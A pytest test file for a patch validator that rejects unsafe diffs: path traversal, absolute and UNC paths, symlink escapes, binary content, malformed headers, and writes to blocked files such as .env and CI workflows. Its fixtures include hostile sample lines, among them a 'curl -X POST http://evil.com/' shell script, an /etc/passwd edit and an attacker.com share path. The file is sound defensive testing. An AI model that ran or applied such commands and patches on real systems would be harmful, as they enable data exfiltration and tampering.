import os
from pathlib import Path
import pytest

from app.patch_validator import (
    PatchValidator,
    PatchValidatorConfig,
    validate_patch,
    PatchValidationResult,
)


@pytest.fixture
def workspace(tmp_path):
    """Create an isolated temporary repository workspace for testing."""
    repo = tmp_path / "test_repo"
    repo.mkdir()
    (repo / "app").mkdir()
    (repo / "tests").mkdir()
    (repo / "app" / "main.py").write_text("def hello(): return 'world'\n", encoding="utf-8")
    (repo / "app" / "calculator.py").write_text("def add(a, b): return a + b\n", encoding="utf-8")
    return repo


# ---------------------------------------------------------------------------
# 1. Valid relative source-file diff
# ---------------------------------------------------------------------------

def test_valid_relative_source_file_diff(workspace):
    diff = """--- a/app/calculator.py
+++ b/app/calculator.py
@@ -1,1 +1,3 @@
 def add(a, b):
+    if not isinstance(a, (int, float)): raise TypeError()
     return a + b
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is True
    assert result.errors == []
    assert result.affected_files == ["app/calculator.py"]
    assert result.total_files_analyzed == 1
    assert result.total_hunks_analyzed == 1


def test_valid_new_file_creation(workspace):
    diff = """--- /dev/null
+++ b/tests/test_calculator.py
@@ -0,0 +1,4 @@
+import pytest
+def test_addition():
+    assert True
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is True
    assert result.errors == []
    assert result.affected_files == ["tests/test_calculator.py"]


# ---------------------------------------------------------------------------
# 2. ../ traversal
# ---------------------------------------------------------------------------

def test_reject_parent_directory_traversal(workspace):
    diff = """--- a/../secret.py
+++ b/../secret.py
@@ -1,1 +1,1 @@
-old
+new
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("traversal" in err.lower() or "outside workspace" in err.lower() for err in result.errors)


def test_reject_nested_traversal(workspace):
    diff = """--- a/app/../../outside.py
+++ b/app/../../outside.py
@@ -1,1 +1,1 @@
-old
+new
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("traversal" in err.lower() or "outside workspace" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 3. Absolute Unix path
# ---------------------------------------------------------------------------

def test_reject_absolute_unix_path(workspace):
    diff = """--- /etc/passwd
+++ /etc/passwd
@@ -1,1 +1,1 @@
-root
+evil
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("absolute paths are forbidden" in err.lower() for err in result.errors)


def test_reject_absolute_internal_path(workspace):
    diff = """--- /app/main.py
+++ /app/main.py
@@ -1,1 +1,1 @@
-pass
+fail
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("absolute paths are forbidden" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 4. Windows drive and UNC paths
# ---------------------------------------------------------------------------

def test_reject_windows_drive_path(workspace):
    diff = """--- a/C:/Windows/System32/drivers/etc/hosts
+++ b/C:/Windows/System32/drivers/etc/hosts
@@ -1,1 +1,1 @@
-127.0.0.1 localhost
+127.0.0.1 evil.com
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("windows drive" in err.lower() or "colon" in err.lower() for err in result.errors)


def test_reject_unc_network_share_path(workspace):
    diff = r"""--- \\attacker.com\share\payload.py
+++ \\attacker.com\share\payload.py
@@ -1,1 +1,1 @@
-old
+new
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("unc" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 5. Symlink escape from repository root
# ---------------------------------------------------------------------------

def test_reject_symlink_target(workspace, tmp_path):
    target_outside = tmp_path / "outside_target.py"
    target_outside.write_text("sensitive = True\n", encoding="utf-8")

    symlink_path = workspace / "app" / "symlink_file.py"
    try:
        os.symlink(str(target_outside), str(symlink_path))
    except (OSError, NotImplementedError):
        pytest.skip("Symlink creation not permitted in this environment")

    diff = """--- a/app/symlink_file.py
+++ b/app/symlink_file.py
@@ -1,1 +1,1 @@
-sensitive = True
+sensitive = False
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("symlink" in err.lower() for err in result.errors)


def test_reject_symlink_parent_directory(workspace, tmp_path):
    dir_outside = tmp_path / "outside_dir"
    dir_outside.mkdir()
    (dir_outside / "escaped.py").write_text("x = 1\n", encoding="utf-8")

    symlink_dir = workspace / "app" / "linked_dir"
    try:
        os.symlink(str(dir_outside), str(symlink_dir), target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("Directory symlinks not permitted in this environment")

    diff = """--- a/app/linked_dir/escaped.py
+++ b/app/linked_dir/escaped.py
@@ -1,1 +1,1 @@
-x = 1
+x = 2
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("symlink" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 6. Binary diff
# ---------------------------------------------------------------------------

def test_reject_git_binary_patch_marker(workspace):
    diff = """diff --git a/binary.dat b/binary.dat
index 1234567..89abcdef
GIT binary patch
literal 10
zc$}7;00001000000000
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("binary" in err.lower() for err in result.errors)


def test_reject_binary_files_differ_marker(workspace):
    diff = """Binary files a/images/icon.png and b/images/icon.png differ"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("binary" in err.lower() for err in result.errors)


def test_reject_null_bytes(workspace):
    diff = "--- a/app/main.py\n+++ b/app/main.py\n@@ -1,1 +1,1 @@\n" + "\x00evil_payload"
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("null byte" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 7. Malformed and truncated headers
# ---------------------------------------------------------------------------

def test_reject_truncated_file_header(workspace):
    diff = """--- a/app/main.py"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("malformed" in err.lower() or "not followed by" in err.lower() for err in result.errors)


def test_reject_missing_hunk_header(workspace):
    diff = """--- a/app/main.py
+++ b/app/main.py
+some added line without hunk header
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("no valid hunk headers" in err.lower() for err in result.errors)


def test_reject_malformed_hunk_header(workspace):
    diff = """--- a/app/main.py
+++ b/app/main.py
@@ broken hunk @@
+added
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("malformed hunk header" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 8. Excessive diff size and file count
# ---------------------------------------------------------------------------

def test_reject_excessive_diff_size(workspace):
    cfg = PatchValidatorConfig(max_diff_size_bytes=100)
    diff = """--- a/app/calculator.py
+++ b/app/calculator.py
@@ -1,1 +1,2 @@
 def add(a, b):
+    # This is a very long comment designed to exceed the tiny 100 byte limit set for this test
     return a + b
"""
    result = validate_patch(diff, workspace, config=cfg)
    assert result.is_valid is False
    assert any("exceeds maximum permitted limit" in err.lower() for err in result.errors)


def test_reject_excessive_file_count(workspace):
    cfg = PatchValidatorConfig(max_files=2)
    diff = """--- a/app/f1.py
+++ b/app/f1.py
@@ -1,1 +1,1 @@
+x = 1
--- a/app/f2.py
+++ b/app/f2.py
@@ -1,1 +1,1 @@
+x = 2
--- a/app/f3.py
+++ b/app/f3.py
@@ -1,1 +1,1 @@
+x = 3
"""
    result = validate_patch(diff, workspace, config=cfg)
    assert result.is_valid is False
    assert any("exceeds limit" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 9. Duplicate file entries
# ---------------------------------------------------------------------------

def test_reject_duplicate_file_entries(workspace):
    diff = """--- a/app/calculator.py
+++ b/app/calculator.py
@@ -1,1 +1,2 @@
+x = 1
--- a/app/calculator.py
+++ b/app/calculator.py
@@ -10,1 +10,2 @@
+y = 2
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("duplicate file entry" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 10. Blocked file extensions and configuration files
# ---------------------------------------------------------------------------

def test_reject_blocked_shell_script(workspace):
    diff = """--- /dev/null
+++ b/scripts/deploy.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+curl -X POST http://evil.com/
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("blocked" in err.lower() for err in result.errors)


def test_reject_blocked_executable(workspace):
    diff = """--- /dev/null
+++ b/bin/helper.exe
@@ -0,0 +1,1 @@
+payload
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("blocked" in err.lower() for err in result.errors)


def test_reject_blocked_credential_file(workspace):
    diff = """--- /dev/null
+++ b/.env
@@ -0,0 +1,1 @@
+SECRET_KEY=12345
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("sensitive file '.env' is blocked" in err.lower() for err in result.errors)


def test_reject_blocked_directory_github_workflow(workspace):
    diff = """--- /dev/null
+++ b/.github/workflows/ci.yml
@@ -0,0 +1,2 @@
+name: CI
+on: push
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any(".github" in err.lower() for err in result.errors)


def test_reject_disallowed_extension(workspace):
    diff = """--- /dev/null
+++ b/app/data.unknown_ext
@@ -0,0 +1,1 @@
+data
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is False
    assert any("allowed extensions" in err.lower() for err in result.errors)


# ---------------------------------------------------------------------------
# 11. Confirmation that validation does not modify files
# ---------------------------------------------------------------------------

def test_validation_does_not_modify_existing_files(workspace):
    target = workspace / "app" / "calculator.py"
    original_bytes = target.read_bytes()
    original_mtime = target.stat().st_mtime_ns

    diff = """--- a/app/calculator.py
+++ b/app/calculator.py
@@ -1,1 +1,2 @@
-def add(a, b): return a + b
+def add(a, b): return a * b
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is True

    # File must be untouched
    assert target.read_bytes() == original_bytes
    assert target.stat().st_mtime_ns == original_mtime


def test_validation_does_not_create_new_files(workspace):
    new_file = workspace / "tests" / "test_uncreated.py"
    assert not new_file.exists()

    diff = """--- /dev/null
+++ b/tests/test_uncreated.py
@@ -0,0 +1,2 @@
+def test_me():
+    pass
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is True

    # File must NOT have been created on disk
    assert not new_file.exists()


def test_validation_does_not_delete_files(workspace):
    target = workspace / "app" / "main.py"
    assert target.exists()

    diff = """--- a/app/main.py
+++ /dev/null
@@ -1,1 +0,0 @@
-def hello(): return 'world'
"""
    result = validate_patch(diff, workspace)
    assert result.is_valid is True

    # File must NOT have been deleted
    assert target.exists()
